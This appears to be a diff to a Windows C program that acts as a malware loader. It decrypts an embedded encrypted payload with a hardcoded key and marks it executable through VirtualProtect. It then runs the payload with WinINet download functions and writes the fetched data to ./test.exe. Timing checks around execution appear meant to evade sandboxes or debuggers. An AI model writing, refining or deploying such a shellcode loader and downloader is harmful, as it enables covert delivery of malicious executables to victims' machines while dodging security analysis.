@@ -39,41 +39,59 @@ void DBGLG(char buf[], ...){
         InternetOpenUrlA,
         InternetReadFile,
         InternetCloseHandle,
-        fwrite,
-        FILE*,
+        unsigned char* buf,
+        int* sz
     }
 */
-typedef void (*payload)(unsigned long long*);
-
+typedef unsigned int (*payload)(unsigned long long*);
+unsigned long long args[] = {InternetOpen, InternetOpenUrlA, InternetReadFile, InternetCloseHandle, NULL, NULL};
 int main(){
-    // TOMFOOLERY
+    TOMFOOLERY
     RECORD_TIME
     unsigned char MasterKey[16];
     for (int i = 0; i< 16; ++i){
         MasterKey[i] = i*16 + i;
     }
-    unsigned char KeyList[176];
     int sz = 0;
+
+    unsigned char KeyList[176];
     PDWORD junk = malloc(sizeof(PDWORD));
     unsigned char execute_me[sizeof(payload_enc_bytes)];
-    unsigned char* buf = malloc(60 * 1024 * sizeof(unsigned char));
-    FILE* file = fopen("./test.exe", "w");
-    // unsigned long long args[6] = {InternetOpen, InternetOpenUrlA, InternetReadFile, InternetCloseHandle, fwrite, file};
-    unsigned long long args[] = {InternetOpen, InternetOpenUrlA, InternetReadFile, InternetCloseHandle, buf, &sz};
-    // unsigned long long args[] = {URLDownloadToFile, path};
+    // unsigned char* buf = malloc(60 * 1024 * sizeof(unsigned char));
+    unsigned char buf[200 * 1024];
+    args[4] = buf;
+    args[5] = &sz;
+    HANDLE hFile = CreateFile("./test.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        fprintf(stderr, "Error opening file. Error code: %d\n", GetLastError());
+        return 1;
+    }
+
+
     // printf("%d\n",payload_ex(args));
+
+    printf("Len is %d\n", sz);
     payload p;
     memcpy(execute_me, payload_enc_bytes, sizeof(payload_enc_bytes));
     KeyScheduler(MasterKey, KeyList);
     for (int i = 0; i < sizeof(payload_enc_bytes); i += 16){
         Decrypt(execute_me + i, KeyList);
     }
+    CHECK_TIME
     VirtualProtect(execute_me, sizeof(payload_enc_bytes), PAGE_EXECUTE_READWRITE, junk);
     p = (payload)(execute_me);
     CHECK_TIME
     p(args);
-    fwrite(buf, 1, sz, file);
-    fclose(file);
+
+    DWORD bytesWritten;
+    BOOL result = WriteFile(hFile, buf, (DWORD)sz, &bytesWritten, NULL);
+
+    if (!result) {
+        fprintf(stderr, "Error writing to file. Error code: %d\n", GetLastError());
+        CloseHandle(hFile);
+        return 1;
+    }
+    CloseHandle(hFile);
     DBGLG("Exit?\n");
     // payload();
     return 0;
